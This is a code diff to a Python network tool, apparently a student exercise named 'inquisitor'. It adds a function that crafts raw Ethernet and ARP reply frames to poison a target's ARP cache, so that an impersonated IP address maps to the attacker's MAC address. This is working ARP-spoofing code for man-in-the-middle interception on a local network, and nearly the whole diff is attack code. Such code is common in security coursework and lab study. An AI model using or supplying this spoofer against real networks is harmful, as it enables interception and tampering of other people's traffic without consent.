@@ -14,7 +14,36 @@ import time
 
 threading_end_event = threading.Event()
 
-def process_packet(header, data, inquisitor):
+def mac_to_bytes(mac_address):
+    return bytes.fromhex(mac_address.replace(':', ''))
+
+def send_arp_reply(interface, attacker_mac, impersonated_ip, target_mac, target_ip):
+    try:    
+        target_mac_bytes = mac_to_bytes(target_mac)
+        attacker_mac_bytes = mac_to_bytes(attacker_mac)
+
+        impersonated_ip_bytes = socket.inet_aton(impersonated_ip)
+        target_ip_bytes = socket.inet_aton(target_ip)
+
+        ethernet_header = struct.pack("!6s6sH", target_mac_bytes, attacker_mac_bytes, ARP_ETHERTYPE)
+
+        arp_packet = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, ARP_REPLY_OP, attacker_mac_bytes, impersonated_ip_bytes, target_mac_bytes, target_ip_bytes)
+
+        full_packet = ethernet_header + arp_packet
+
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ARP_ETHERTYPE))
+        s.bind((interface, 0))
+
+        s.send(full_packet)
+        s.close()
+        # log_debug(f"Sent poisoned ARP reply: {impersonated_ip} (Attacker {attacker_mac}) -> {target_ip} ({target_mac})")
+
+    except PermissionError:
+        log_error("Permission denied. Sending raw packets requires root privileges.")
+    except Exception as e:
+        log_error(f"Error sending ARP reply: {e}")
+
+def process_request_packet(header, data, inquisitor):
     sender_mac, sender_ip, target_mac, target_ip = None, None, None, None
     try:
         eth_type = struct.unpack("!H", data[12:14])[0]
